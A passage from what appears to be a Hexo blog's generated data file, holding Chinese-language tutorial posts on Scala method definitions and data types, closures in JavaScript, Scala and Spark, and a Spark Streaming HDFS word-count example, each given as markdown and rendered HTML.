|\tShort |\t16位有符号值，范围从-32768至32767\n3 |\tInt |\t32位有符号值，范围从-2147483648至2147483647\n4 |\tLong |\t64位有符号值，范围从-9223372036854775808至9223372036854775807\n5 |\tFloat |\t32位IEEE 754单精度浮点值\n6 |\tDouble |\t64位IEEE 754双精度浮点值\n7 |\tChar |\t16位无符号Unicode字符。范围从U+0000到U+FFFF\n8 |\tString |\t一个Char类型序列\n9 |\tBoolean |\t文字值true或文字值false\n10 |Unit |\t对应于无值\n11 |Null |\tnull或空引用\n12 |Nothing |\t每种其他类型的亚型; 不包括无值\n13 |Any |\t任何类型的超类型; 任何对象的类型为Any\n14 |AnyRef |\t任何引用类型的超类型\n\n\n一个不返回任何东西的函数可以返回一个类似在Java中的void类型，并表示该函数不返回任何内容。 在Scala中不返回任何东西的函数称为过程。\n\n```\nobject Hello{\n   def printMe( ) : Unit = {\n      println(\"Hello, Scala!\")\n   }\n}\n```","source":"_posts/spark/8.scala方法定义.md","raw":"---\ntitle: 8.scala方法定义\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n形式：\n\n    def functionName ([list of parameters]) : [return type]\n\n例子\n```\n    object add {\n   def addInt( a:Int, b:Int ) : Int = {\n      var sum:Int = 0\n      sum = a + b\n      return sum\n   }\n}\n```\n数据类型\n\nheader 1 | header 2 | sadas\n---|---|---\n1 |\tByte |\t8位有符号值，范围从-128至127\n2 |\tShort |\t16位有符号值，范围从-32768至32767\n3 |\tInt |\t32位有符号值，范围从-2147483648至2147483647\n4 |\tLong |\t64位有符号值，范围从-9223372036854775808至9223372036854775807\n5 |\tFloat |\t32位IEEE 754单精度浮点值\n6 |\tDouble |\t64位IEEE 754双精度浮点值\n7 |\tChar |\t16位无符号Unicode字符。范围从U+0000到U+FFFF\n8 |\tString |\t一个Char类型序列\n9 |\tBoolean |\t文字值true或文字值false\n10 |Unit |\t对应于无值\n11 |Null |\tnull或空引用\n12 |Nothing |\t每种其他类型的亚型; 不包括无值\n13 |Any |\t任何类型的超类型; 任何对象的类型为Any\n14 |AnyRef |\t任何引用类型的超类型\n\n\n一个不返回任何东西的函数可以返回一个类似在Java中的void类型，并表示该函数不返回任何内容。 在Scala中不返回任何东西的函数称为过程。\n\n```\nobject Hello{\n   def printMe( ) : Unit = {\n      println(\"Hello, Scala!\")\n   }\n}\n```","slug":"spark/8.scala方法定义","published":1,"updated":"2018-07-10T13:10:09.988Z","_id":"cjjedmhc1007w0gtjsghwbi89","comments":1,"layout":"post","photos":[],"link":"","content":"<p>形式：</p>\n<pre><code>def functionName ([list of parameters]) : [return type]\n</code></pre><p>例子<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    object add &#123;</span><br><span class=\"line\">   def addInt( a:Int, b:Int ) : Int = &#123;</span><br><span class=\"line\">      var sum:Int = 0</span><br><span class=\"line\">      sum = a + b</span><br><span class=\"line\">      return sum</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>数据类型</p>\n<table>\n<thead>\n<tr>\n<th>header 1</th>\n<th>header 2</th>\n<th>sadas</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>Byte</td>\n<td>8位有符号值，范围从-128至127</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Short</td>\n<td>16位有符号值，范围从-32768至32767</td>\n</tr>\n<tr>\n<td>3</td>\n<td>Int</td>\n<td>32位有符号值，范围从-2147483648至2147483647</td>\n</tr>\n<tr>\n<td>4</td>\n<td>Long</td>\n<td>64位有符号值，范围从-9223372036854775808至9223372036854775807</td>\n</tr>\n<tr>\n<td>5</td>\n<td>Float</td>\n<td>32位IEEE 754单精度浮点值</td>\n</tr>\n<tr>\n<td>6</td>\n<td>Double</td>\n<td>64位IEEE 754双精度浮点值</td>\n</tr>\n<tr>\n<td>7</td>\n<td>Char</td>\n<td>16位无符号Unicode字符。范围从U+0000到U+FFFF</td>\n</tr>\n<tr>\n<td>8</td>\n<td>String</td>\n<td>一个Char类型序列</td>\n</tr>\n<tr>\n<td>9</td>\n<td>Boolean</td>\n<td>文字值true或文字值false</td>\n</tr>\n<tr>\n<td>10</td>\n<td>Unit</td>\n<td>对应于无值</td>\n</tr>\n<tr>\n<td>11</td>\n<td>Null</td>\n<td>null或空引用</td>\n</tr>\n<tr>\n<td>12</td>\n<td>Nothing</td>\n<td>每种其他类型的亚型; 不包括无值</td>\n</tr>\n<tr>\n<td>13</td>\n<td>Any</td>\n<td>任何类型的超类型; 任何对象的类型为Any</td>\n</tr>\n<tr>\n<td>14</td>\n<td>AnyRef</td>\n<td>任何引用类型的超类型</td>\n</tr>\n</tbody>\n</table>\n<p>一个不返回任何东西的函数可以返回一个类似在Java中的void类型，并表示该函数不返回任何内容。 在Scala中不返回任何东西的函数称为过程。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">object Hello&#123;</span><br><span class=\"line\">   def printMe( ) : Unit = &#123;</span><br><span class=\"line\">      println(&quot;Hello, Scala!&quot;)</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>形式：</p>\n<pre><code>def functionName ([list of parameters]) : [return type]\n</code></pre><p>例子<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    object add &#123;</span><br><span class=\"line\">   def addInt( a:Int, b:Int ) : Int = &#123;</span><br><span class=\"line\">      var sum:Int = 0</span><br><span class=\"line\">      sum = a + b</span><br><span class=\"line\">      return sum</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>数据类型</p>\n<table>\n<thead>\n<tr>\n<th>header 1</th>\n<th>header 2</th>\n<th>sadas</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>Byte</td>\n<td>8位有符号值，范围从-128至127</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Short</td>\n<td>16位有符号值，范围从-32768至32767</td>\n</tr>\n<tr>\n<td>3</td>\n<td>Int</td>\n<td>32位有符号值，范围从-2147483648至2147483647</td>\n</tr>\n<tr>\n<td>4</td>\n<td>Long</td>\n<td>64位有符号值，范围从-9223372036854775808至9223372036854775807</td>\n</tr>\n<tr>\n<td>5</td>\n<td>Float</td>\n<td>32位IEEE 754单精度浮点值</td>\n</tr>\n<tr>\n<td>6</td>\n<td>Double</td>\n<td>64位IEEE 754双精度浮点值</td>\n</tr>\n<tr>\n<td>7</td>\n<td>Char</td>\n<td>16位无符号Unicode字符。范围从U+0000到U+FFFF</td>\n</tr>\n<tr>\n<td>8</td>\n<td>String</td>\n<td>一个Char类型序列</td>\n</tr>\n<tr>\n<td>9</td>\n<td>Boolean</td>\n<td>文字值true或文字值false</td>\n</tr>\n<tr>\n<td>10</td>\n<td>Unit</td>\n<td>对应于无值</td>\n</tr>\n<tr>\n<td>11</td>\n<td>Null</td>\n<td>null或空引用</td>\n</tr>\n<tr>\n<td>12</td>\n<td>Nothing</td>\n<td>每种其他类型的亚型; 不包括无值</td>\n</tr>\n<tr>\n<td>13</td>\n<td>Any</td>\n<td>任何类型的超类型; 任何对象的类型为Any</td>\n</tr>\n<tr>\n<td>14</td>\n<td>AnyRef</td>\n<td>任何引用类型的超类型</td>\n</tr>\n</tbody>\n</table>\n<p>一个不返回任何东西的函数可以返回一个类似在Java中的void类型，并表示该函数不返回任何内容。 在Scala中不返回任何东西的函数称为过程。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">object Hello&#123;</span><br><span class=\"line\">   def printMe( ) : Unit = &#123;</span><br><span class=\"line\">      println(&quot;Hello, Scala!&quot;)</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"9.JavaScript，Scala，spark中的闭包","date":"2018-07-10T13:09:19.000Z","_content":"#### JavaScript的闭包\n```\n(function(){\n    var hello=\"hello,world\";\n    function welcome(hi){\n        alert(hi);        //解析到作用域链的第一个对象的属性\n        alert(hello);    //解析到作用域链的第二个对象的属性\n    }\n    welcome(\"It's easy\");\n})();\n\n作者：知乎用户\n链接：https://www.zhihu.com/question/34547104/answer/59515735\n来源：知乎\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n```\n每次定义一个函数，都会产生一个作用域链（scope chain）。当JavaScript寻找变量varible时（这个过程称为变量解析），总会优先在当前作用域链的第一个对象中查找属性varible，如果找到，则直接使用这个属性；否则，继续查找下一个对象的是否存在这个属性；这个过程会持续直至找到这个属性或者最终未找到引发错误为止\n\n#### scala闭包\n```\nobject Closure {\n  def main(args: Array[String]): Unit = {\n    val c = add(1)\n    println(c)\n  }\n\n  val b = 10\n  val add = (a: Int) => {\n    b - a\n  }\n}\n```\n闭包是一个函数，它返回值取决于在此函数之外声明的一个或多个变量的值。\n\n#### spark中的闭包\n\n在集群中执行代码时，一个关于 Spark 更难的事情是理解的变量和方法的范围和生命周期。\n\n修改其范围之外的变量 RDD 操作可以混淆的常见原因。在下面的例子中，我们将看一下使用的 foreach() 代码递增累加计数器，但类似的问题，也可能会出现其他操作上。\n\n示例\n考虑一个简单的 RDD 元素求和，以下行为可能不同，具体取决于是否在同一个 JVM 中执行。\n一个常见的例子是当 Spark 运行在本地模式（--master = local[n]）时，与部署 Spark 应用到群集（例如，通过 spark-submit 到 YARN）: \n```\nvar counter = 0\nvar rdd = sc.parallelize(data)\n \n// Wrong: Don't do this!!\nrdd.foreach(x => counter += x)\n \nprintln(\"Counter value: \" + counter)\n```","source":"_posts/spark/9.JavaScript，Scala，spark中的闭包.md","raw":"---\ntitle: 9.JavaScript，Scala，spark中的闭包\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n#### JavaScript的闭包\n```\n(function(){\n    var hello=\"hello,world\";\n    function welcome(hi){\n        alert(hi);        //解析到作用域链的第一个对象的属性\n        alert(hello);    //解析到作用域链的第二个对象的属性\n    }\n    welcome(\"It's easy\");\n})();\n\n作者：知乎用户\n链接：https://www.zhihu.com/question/34547104/answer/59515735\n来源：知乎\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n```\n每次定义一个函数，都会产生一个作用域链（scope chain）。当JavaScript寻找变量varible时（这个过程称为变量解析），总会优先在当前作用域链的第一个对象中查找属性varible，如果找到，则直接使用这个属性；否则，继续查找下一个对象的是否存在这个属性；这个过程会持续直至找到这个属性或者最终未找到引发错误为止\n\n#### scala闭包\n```\nobject Closure {\n  def main(args: Array[String]): Unit = {\n    val c = add(1)\n    println(c)\n  }\n\n  val b = 10\n  val add = (a: Int) => {\n    b - a\n  }\n}\n```\n闭包是一个函数，它返回值取决于在此函数之外声明的一个或多个变量的值。\n\n#### spark中的闭包\n\n在集群中执行代码时，一个关于 Spark 更难的事情是理解的变量和方法的范围和生命周期。\n\n修改其范围之外的变量 RDD 操作可以混淆的常见原因。在下面的例子中，我们将看一下使用的 foreach() 代码递增累加计数器，但类似的问题，也可能会出现其他操作上。\n\n示例\n考虑一个简单的 RDD 元素求和，以下行为可能不同，具体取决于是否在同一个 JVM 中执行。\n一个常见的例子是当 Spark 运行在本地模式（--master = local[n]）时，与部署 Spark 应用到群集（例如，通过 spark-submit 到 YARN）: \n```\nvar counter = 0\nvar rdd = sc.parallelize(data)\n \n// Wrong: Don't do this!!\nrdd.foreach(x => counter += x)\n \nprintln(\"Counter value: \" + counter)\n```","slug":"spark/9.JavaScript，Scala，spark中的闭包","published":1,"updated":"2018-07-10T13:10:09.989Z","_id":"cjjedmhc2007y0gtjdnjtww6i","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"JavaScript的闭包\"><a href=\"#JavaScript的闭包\" class=\"headerlink\" title=\"JavaScript的闭包\"></a>JavaScript的闭包</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(function()&#123;</span><br><span class=\"line\">    var hello=&quot;hello,world&quot;;</span><br><span class=\"line\">    function welcome(hi)&#123;</span><br><span class=\"line\">        alert(hi);        //解析到作用域链的第一个对象的属性</span><br><span class=\"line\">        alert(hello);    //解析到作用域链的第二个对象的属性</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    welcome(&quot;It&apos;s easy&quot;);</span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"></span><br><span class=\"line\">作者：知乎用户</span><br><span class=\"line\">链接：https://www.zhihu.com/question/34547104/answer/59515735</span><br><span class=\"line\">来源：知乎</span><br><span class=\"line\">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>\n<p>每次定义一个函数，都会产生一个作用域链（scope chain）。当JavaScript寻找变量varible时（这个过程称为变量解析），总会优先在当前作用域链的第一个对象中查找属性varible，如果找到，则直接使用这个属性；否则，继续查找下一个对象的是否存在这个属性；这个过程会持续直至找到这个属性或者最终未找到引发错误为止</p>\n<h4 id=\"scala闭包\"><a href=\"#scala闭包\" class=\"headerlink\" title=\"scala闭包\"></a>scala闭包</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">object Closure &#123;</span><br><span class=\"line\">  def main(args: Array[String]): Unit = &#123;</span><br><span class=\"line\">    val c = add(1)</span><br><span class=\"line\">    println(c)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  val b = 10</span><br><span class=\"line\">  val add = (a: Int) =&gt; &#123;</span><br><span class=\"line\">    b - a</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>闭包是一个函数，它返回值取决于在此函数之外声明的一个或多个变量的值。</p>\n<h4 id=\"spark中的闭包\"><a href=\"#spark中的闭包\" class=\"headerlink\" title=\"spark中的闭包\"></a>spark中的闭包</h4><p>在集群中执行代码时，一个关于 Spark 更难的事情是理解的变量和方法的范围和生命周期。</p>\n<p>修改其范围之外的变量 RDD 操作可以混淆的常见原因。在下面的例子中，我们将看一下使用的 foreach() 代码递增累加计数器，但类似的问题，也可能会出现其他操作上。</p>\n<p>示例<br>考虑一个简单的 RDD 元素求和，以下行为可能不同，具体取决于是否在同一个 JVM 中执行。<br>一个常见的例子是当 Spark 运行在本地模式（–master = local[n]）时，与部署 Spark 应用到群集（例如，通过 spark-submit 到 YARN）:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var counter = 0</span><br><span class=\"line\">var rdd = sc.parallelize(data)</span><br><span class=\"line\"> </span><br><span class=\"line\">// Wrong: Don&apos;t do this!!</span><br><span class=\"line\">rdd.foreach(x =&gt; counter += x)</span><br><span class=\"line\"> </span><br><span class=\"line\">println(&quot;Counter value: &quot; + counter)</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"JavaScript的闭包\"><a href=\"#JavaScript的闭包\" class=\"headerlink\" title=\"JavaScript的闭包\"></a>JavaScript的闭包</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(function()&#123;</span><br><span class=\"line\">    var hello=&quot;hello,world&quot;;</span><br><span class=\"line\">    function welcome(hi)&#123;</span><br><span class=\"line\">        alert(hi);        //解析到作用域链的第一个对象的属性</span><br><span class=\"line\">        alert(hello);    //解析到作用域链的第二个对象的属性</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    welcome(&quot;It&apos;s easy&quot;);</span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"></span><br><span class=\"line\">作者：知乎用户</span><br><span class=\"line\">链接：https://www.zhihu.com/question/34547104/answer/59515735</span><br><span class=\"line\">来源：知乎</span><br><span class=\"line\">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>\n<p>每次定义一个函数，都会产生一个作用域链（scope chain）。当JavaScript寻找变量varible时（这个过程称为变量解析），总会优先在当前作用域链的第一个对象中查找属性varible，如果找到，则直接使用这个属性；否则，继续查找下一个对象的是否存在这个属性；这个过程会持续直至找到这个属性或者最终未找到引发错误为止</p>\n<h4 id=\"scala闭包\"><a href=\"#scala闭包\" class=\"headerlink\" title=\"scala闭包\"></a>scala闭包</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">object Closure &#123;</span><br><span class=\"line\">  def main(args: Array[String]): Unit = &#123;</span><br><span class=\"line\">    val c = add(1)</span><br><span class=\"line\">    println(c)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  val b = 10</span><br><span class=\"line\">  val add = (a: Int) =&gt; &#123;</span><br><span class=\"line\">    b - a</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>闭包是一个函数，它返回值取决于在此函数之外声明的一个或多个变量的值。</p>\n<h4 id=\"spark中的闭包\"><a href=\"#spark中的闭包\" class=\"headerlink\" title=\"spark中的闭包\"></a>spark中的闭包</h4><p>在集群中执行代码时，一个关于 Spark 更难的事情是理解的变量和方法的范围和生命周期。</p>\n<p>修改其范围之外的变量 RDD 操作可以混淆的常见原因。在下面的例子中，我们将看一下使用的 foreach() 代码递增累加计数器，但类似的问题，也可能会出现其他操作上。</p>\n<p>示例<br>考虑一个简单的 RDD 元素求和，以下行为可能不同，具体取决于是否在同一个 JVM 中执行。<br>一个常见的例子是当 Spark 运行在本地模式（–master = local[n]）时，与部署 Spark 应用到群集（例如，通过 spark-submit 到 YARN）:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var counter = 0</span><br><span class=\"line\">var rdd = sc.parallelize(data)</span><br><span class=\"line\"> </span><br><span class=\"line\">// Wrong: Don&apos;t do this!!</span><br><span class=\"line\">rdd.foreach(x =&gt; counter += x)</span><br><span class=\"line\"> </span><br><span class=\"line\">println(&quot;Counter value: &quot; + counter)</span><br></pre></td></tr></table></figure></p>\n"},{"title":"SparkStream例子HdfsWordCount","date":"2018-07-10T13:09:19.000Z","_content":"#### spark github上的例子\n#### 程序描述\n\n 计算给定目录下的新文件的单词个数\n \n 运行的时候在hdfs上设置一个目录\n \n 然后实时的往目录里放文件\n \n 程序可以文件中单词的个数\n #### 代码\n```\npackage stream\n\nimport org.apache.spark.SparkConf\nimport org.apache.spark.streaming.{Seconds, StreamingContext}\n\nobject HdfsWordCount {\n\n  def main(args: Array[String]) {\n    //val args = Array(\"D:\\\\workspace\\\\idea\\\\spark-test\\\\data\")//z这里是目录不是文件\n    if (args.length < 1) {\n      System.err.println(\"Usage: HdfsWordCount <directory>\")\n      System.exit(1)\n    }\n\n    StreamingExamples.setStreamingLogLevels()\n    val sparkConf = new SparkConf().setAppName(\"sadsadas\").setMaster(\"local\")\n    \n    // 初始化\n    val ssc = new StreamingContext(sparkConf, Seconds(10))\n    \n    // 创建输入流，然后计算新文件的单词个数\n    val lines = ssc.textFileStream(args(0))\n    val words = lines.flatMap(_.split(\" \"))\n    val wordCounts = words.map(x => (x, 1)).reduceByKey(_ + _)\n    \n    //输出计算结果\n    wordCounts.print()\n    \n    ssc.start()\n    ssc.awaitTermination()\n  }\n}\n// scalastyle:on println\n```\n#### 打包运行\nmvn install \n\n程序包：\ntest-1.0.jar\n\n程序主类：\nstream.HdfsWordCount\n\n参数:\nhdfs上的目录\n\ninput\n\n命令：\n\n    spark-submit --class stream.HdfsWordCount --master yarn --deploy-mode cluster  test-1.0.jar input\n\n#### 运行结果\n 向hdfs的目录中放入新文件,文件hello.txt\n \n    hadoop fs -put hello.text input\n 运行结果\n \n ```\n -------------------------------------------\nTime: 1513337720000 ms\n-------------------------------------------\n(input/pretreatment,1)\n(Found,1)\n(drwxr-xr-x,3)\n(0,3)\n(input/tables,1)\n(11:16,2)\n(,33)\n(3,1)\n(2017-12-04,2)\n(-,3)\n...\n\n ```\n ","source":"_posts/spark/SparkStream例子HdfsWordCount.md","raw":"---\ntitle: SparkStream例子HdfsWordCount\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n#### spark github上的例子\n#### 程序描述\n\n 计算给定目录下的新文件的单词个数\n \n 运行的时候在hdfs上设置一个目录\n \n 然后实时的往目录里放文件\n \n 程序可以文件中单词的个数\n #### 代码\n```\npackage stream\n\nimport org.apache.spark.SparkConf\nimport org.apache.spark.streaming.{Seconds, StreamingContext}\n\nobject HdfsWordCount {\n\n  def main(args: Array[String]) {\n    //val args = Array(\"D:\\\\workspace\\\\idea\\\\spark-test\\\\data\")//z这里是目录不是文件\n    if (args.length < 1) {\n      System.err.println(\"Usage: HdfsWordCount <directory>\")\n      System.exit(1)\n    }\n\n    StreamingExamples.setStreamingLogLevels()\n    val sparkConf = new SparkConf().setAppName(\"sadsadas\").setMaster(\"local\")\n    \n    // 初始化\n    val ssc = new StreamingContext(sparkConf, Seconds(10))\n    \n    // 创建输入流，然后计算新文件的单词个数\n    val lines = ssc.textFileStream(args(0))\n    val words = lines.flatMap(_.split(\" \"))\n    val wordCounts = words.map(x => (x, 1)).reduceByKey(_ + _)\n    \n    //输出计算结果\n    wordCounts.print()\n    \n    ssc.start()\n    ssc.awaitTermination()\n  }\n}\n// scalastyle:on println\n```\n#### 打包运行\nmvn install \n\n程序包：\ntest-1.0.jar\n\n程序主类：\nstream.HdfsWordCount\n\n参数:\nhdfs上的目录\n\ninput\n\n命令：\n\n    spark-submit --class stream.HdfsWordCount --master yarn --deploy-mode cluster  test-1.0.jar input\n\n#### 运行结果\n 向hdfs的目录中放入新文件,文件hello.txt\n \n    hadoop fs -put hello.text input\n 运行结果\n \n ```\n -------------------------------------------\nTime: 1513337720000 ms\n-------------------------------------------\n(input/pretreatment,1)\n(Found,1)\n(drwxr-xr-x,3)\n(0,3)\n(input/tables,1)\n(11:16,2)\n(,33)\n(3,1)\n(2017-12-04,2)\n(-,3)\n...\n\n ```\n ","slug":"spark/SparkStream例子HdfsWordCount","published":1,"updated":"2018-07-10T13:10:09.990Z","_id":"cjjedmhc400800gtjlzbqnxny","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"spark-github上的例子\"><a href=\"#spark-github上的例子\" class=\"headerlink\" title=\"spark github上的例子\"></a>spark github上的例子</h4><h4 id=\"程序描述\"><a href=\"#程序描述\" class=\"headerlink\" title=\"程序描述\"></a>程序描述</h4><p> 计算给定目录下的新文件的单词个数</p>\n<p> 运行的时候在hdfs上设置一个目录</p>\n<p> 然后实时的往目录里放文件</p>\n<p> 程序可以文件中单词的个数</p>\n<h4 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package stream</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.spark.SparkConf</span><br><span class=\"line\">import org.apache.spark.streaming.&#123;Seconds, StreamingContext&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">object HdfsWordCount &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  def main(args: Array[String]) &#123;</span><br><span class=\"line\">    //val args = Array(&quot;D:\\\\workspace\\\\idea\\\\spark-test\\\\data&quot;)//z这里是目录不是文件</span><br><span class=\"line\">    if (args.length &lt; 1) &#123;</span><br><span class=\"line\">      System.err.println(&quot;Usage: HdfsWordCount &lt;directory&gt;&quot;)</span><br><span class=\"line\">      System.exit(1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    StreamingExamples.setStreamingLogLevels()</span><br><span class=\"line\">    val sparkConf = new SparkConf().setAppName(&quot;sadsadas&quot;).setMaster(&quot;local&quot;)</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 初始化</span><br><span class=\"line\">    val ssc = new StreamingContext(sparkConf, Seconds(10))</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 创建输入流，然后计算新文件的单词个数</span><br><span class=\"line\">    val lines = ssc.textFileStream(args(0))</span><br><span class=\"line\">    val words = lines.flatMap(_.split(&quot; &quot;))</span><br><span class=\"line\">    val wordCounts = words.map(x =&gt; (x, 1)).reduceByKey(_ + _)</span><br><span class=\"line\">    </span><br><span class=\"line\">    //输出计算结果</span><br><span class=\"line\">    wordCounts.print()</span><br><span class=\"line\">    </span><br><span class=\"line\">    ssc.start()</span><br><span class=\"line\">    ssc.awaitTermination()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// scalastyle:on println</span><br></pre></td></tr></table></figure>\n<h4 id=\"打包运行\"><a href=\"#打包运行\" class=\"headerlink\" title=\"打包运行\"></a>打包运行</h4><p>mvn install </p>\n<p>程序包：<br>test-1.0.jar</p>\n<p>程序主类：<br>stream.HdfsWordCount</p>\n<p>参数:<br>hdfs上的目录</p>\n<p>input</p>\n<p>命令：</p>\n<pre><code>spark-submit --class stream.HdfsWordCount --master yarn --deploy-mode cluster  test-1.0.jar input\n</code></pre><h4 id=\"运行结果\"><a href=\"#运行结果\" class=\"headerlink\" title=\"运行结果\"></a>运行结果</h4><p> 向hdfs的目录中放入新文件,文件hello.txt</p>\n<pre><code>hadoop fs -put hello.text input\n</code></pre><p> 运行结果</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> -------------------------------------------</span><br><span class=\"line\">Time: 1513337720000 ms</span><br><span class=\"line\">-------------------------------------------</span><br><span class=\"line\">(input/pretreatment,1)</span><br><span class=\"line\">(Found,1)</span><br><span class=\"line\">(drwxr-xr-x,3)</span><br><span class=\"line\">(0,3)</span><br><span class=\"line\">(input/tables,1)</span><br><span 